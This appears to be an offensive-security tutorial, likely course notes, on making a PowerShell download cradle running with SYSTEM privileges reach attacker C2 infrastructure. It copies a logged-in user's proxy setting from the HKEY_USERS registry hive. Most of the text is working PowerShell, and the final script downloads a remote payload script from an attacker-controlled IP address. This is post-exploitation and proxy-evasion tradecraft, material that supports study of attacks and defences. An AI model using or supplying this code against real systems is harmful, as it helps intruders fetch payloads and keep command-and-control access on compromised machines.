## A SYSTEM proxy? What?
If we get a root shell on the system, we're gonna run into some problems.
A PowerShell download cradle running in SYSTEM integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.

To solve this problem, we can copy the proxy settings for a user from the windows registery and pouplate the system account with it.
Proxy settings are stored in:
```PATH
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings
```

We can collect the contents of the _ProxyServer_ registry key and use it to populate the proxy properties of the _Net.WebClient_ object.

BUT!

The _HKEY_USERS_ registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective _SIDs_.

We can start by mapping the HKEY_USERS hive with the New-PSDrive commandlet of powershell as follows:
```Powershell
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
```

We must now, loop through all the top level entries of HKEY_USERS till we find one with a matchin SID.
We can then filter out the lower 10 characters leaving only the SID, while omitting the HKEY_USERS string.

We can find all the top-level HKEY_USERS with the _Get-ChildItem_ cmdlet and use a _ForEach_ loop to find the first that contains a SID starting with "S-1-5-21-" as follows:
```Powershell
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
```
We stop the loop once we find a valid key and store it in $start variable.

We can then use Get-ItemProperty commandlet to fetch the contents:
```Powershell
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```
The code shown above gathers the proxy server IP address and network port from the registry and assigns it to the _$proxyAddr_ variable.


We can now create a new object from the _WebProxy_ class and assign it as the _DefaultWebProxy_ that is built into all _Net.WebClient_ objects.
```Powershell
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

Our final code looks like so:
```Powershell
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'

ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = 
$key.Name.substring(10);break}}

$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer

[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")

$wc = new-object system.net.WebClient

$wc.DownloadString("http://192.168.49.150/run2.ps1")
```